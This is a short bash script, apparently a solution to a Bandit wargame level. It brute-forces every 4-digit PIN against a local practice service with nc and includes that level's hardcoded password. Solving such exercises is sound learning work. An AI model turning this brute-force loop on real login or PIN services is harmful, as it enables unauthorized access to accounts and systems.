#!/bin/bash

# Replace this with the actual password for bandit24
bandit24_password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Define the host and port
host="localhost"
port="30002"

echo "Running..."

# Function to send password and pincode
function try_pincode {
    local pincode=$1
    echo -e "$bandit24_password $pincode" | nc -w 1 $host $port
}

# Iterate through all possible 4-digit pincodes
for pincode in $(seq -w 0000 9999); do
    # Print the current pincode being tried
    echo -ne "\rTrying pincode: $pincode"
    
    response=$(try_pincode $pincode)

    # Check for the correct response keyword
    if echo "$response" | grep -q "Correct"; then
        echo -e "\n\nCorrect pincode found: $pincode"
        echo "$response"
        break
    fi
done

echo -e "\nFinished checking all pincodes."
